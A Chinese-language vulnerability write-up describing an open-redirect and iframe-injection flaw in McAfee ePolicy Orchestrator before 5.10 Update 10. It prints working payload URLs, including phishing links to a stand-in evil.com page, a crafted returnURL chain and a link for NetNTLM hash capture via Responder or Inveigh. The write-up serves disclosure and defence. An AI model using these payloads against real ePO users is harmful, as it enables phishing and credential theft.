**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

![](https://image.3001.net/images/20210329/1617019172_6061c1248111b0c58aff4.png!small)

## 受影响产品

McAfee ePolicy Orchestrator (ePO) - 低于5.10 Update 10版本

## 漏洞类型

OWASP Top Ten 2013 Category A10 - 未验证的重定向和转发

## 漏洞概述

低于5.10 Update 10版本的McAfee ePolicy Orchestrator
(ePO)产品中被曝存在未经验证的客户端URL重定向漏洞，该漏洞可能会导致经过身份验证的ePO用户在ePO
IFRAME中加载不受信任的站点，从而允许攻击者窃取经过身份验证的用户的敏感信息。这将要求攻击者想办法诱使ePO用户单击恶意链接，同时利用目标用户单击恶意链接时的浏览器登录ePO服务器。

## 漏洞分析

在企业内部安全评估活动中，我的任务一般都是测试关键的公司基础设施和软件。在这一次，我们团队的任务则是测试我们公司所使用的McAfee ePolicy
Orchestrator产品以及相关的部署情况。

在评估过程中，我注意到该产品使用了大量的postMessage和Websockets，但其中有一点引起了我们的主意，即地址栏中的URL构造。

下面给出的是我们在访问McAfee ePolicy Orchestrator仪表盘时，浏览器地址栏中常规的IP/URL结构：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#/core/orionDefaultPage.do

/core/orionDefaultPage.do部分实际上是一个HTTP节点，跟其他HTTP节点一样，它会在“顶部仪表盘控制栏”下的一个IFRAME中呈现给用户，但它同时也会呈现在其他的IFRAME种。

注意到这一点之后，我尝试的第一件事就是注入一个简单的跨站脚本Payload然后查看结果：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#//javascript:alert(1))

但是，Web应用程序会正确过滤掉我们的Payload，以及我所尝试注入的其他Payload。

于是我打算检查一下用于执行数据过滤的JavaScript代码，然后我发现了下面这个东西：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#//google.com

仪表盘现在将会在“顶部仪表盘控制栏”下的一个IFRAME中显示Google搜索页面。通过使用这种简单的双斜杠Payload，攻击者将能够向仪表盘中注入任何网站。考虑到仪表盘给用户呈现数据时所采用的方式，攻击者不仅可以执行成功率极高的网络钓鱼攻击，而且还可以执行NetNTLM哈希泄露攻击。

## 网络钓鱼攻击场景

下面给出的是McAfee ePolicy Orchestrator的常规IP/URL结构：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#/core/orionDefaultPage.do

攻击者只需要将(#)之后的内容替换为恶意URL/域名，并将URL发送给拥有仪表盘访问权限的用户即可：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#//evil.com/phish-page.php

![](https://image.3001.net/images/20210329/1617019209_6061c149090a0aff8285a.png!small)

![](https://image.3001.net/images/20210329/1617019215_6061c14f6cf5bd39787d1.png!small)

![](https://image.3001.net/images/20210329/1617019221_6061c155eb1d7cd854c89.png!small)

这里需要注意的是，恶意域名托管的页面不能将X-Frame-Options设置为“DENY”或“SAMEORIGIN”，以确保域名能够正确地在仪表盘IFRAME中被加载。不过，恶意站点都是攻击者控制的，这一点显然不会成为问题。

对于更实际的网络钓鱼攻击，可以利用仪表板授权节点及其GET参数returnURL构造可信度更高的URL：

    
    
    https://epo-host:8443/SoftwareMgmt/enterLicenseKey.do?returnURL=%2f..%2fcore%2forionNavigationLogin.do%23%2f%2fevil.com%2fphish-page.php

上面的这个连接会将用户导航到仪表盘中的“许可证密钥”设置页面中，在用户执行任何操作（保存或取消）后，他将被重定向到钓鱼网页：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#//evil.com/phish-page.php

## ePO用户NetNTLM哈希泄露场景

攻击者还可以设计一个恶意链接，并将其指向运行了Responder或Inveigh的主机，并将其发送给具备仪表盘访问权限的用户，来执行NetNTLM哈希泄露攻击：

    
    
    https://epo-host:8443/core/orionNavigationLogin.do#//host-running-responder-or-inveigh

